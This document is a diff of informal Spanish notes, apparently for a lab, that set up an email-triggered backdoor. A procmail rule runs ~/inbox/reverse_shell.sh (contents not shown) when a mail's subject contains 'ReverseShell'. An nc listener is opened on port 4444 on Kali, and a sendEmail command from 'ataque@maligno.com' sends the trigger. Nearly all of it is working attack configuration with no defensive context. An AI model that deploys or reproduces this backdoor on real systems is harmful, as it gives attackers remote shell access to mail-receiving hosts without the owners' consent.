@@ -1,0 +1,40 @@
+Crea un script
+nano ~/inbox/reverse_shell.sh
+
+
+
+Añade esto a 
+nano ~/.procmailrc
+
+:0
+* ^Subject: ReverseShell
+| $HOME/inbox/reverse_shell.sh
+
+abre una pestala en kali
+nc -nlvp 4444
+
+
+
+envia el sendEmail
+sendEmail -f ataque@maligno.com -t vagrant@ubuntu.local -u "ReverseShell" -m "Abre puerta trasera" -s 192.168.0.31 -o tls=no
+
+
+ota configuracion 
+
+
+LOGFILE=$HOME/procmail.log
+VERBOSE=yes
+
+# Si el asunto es ReverseShell, ejecutar el script reverse_shell.sh
+:0
+* ^Subject:.*ReverseShell
+| $HOME/inbox/reverse_shell.sh
+
+# Por defecto, guardar todos los correos como msg.*
+:0:
+$HOME/inbox
+
+
+
+
+
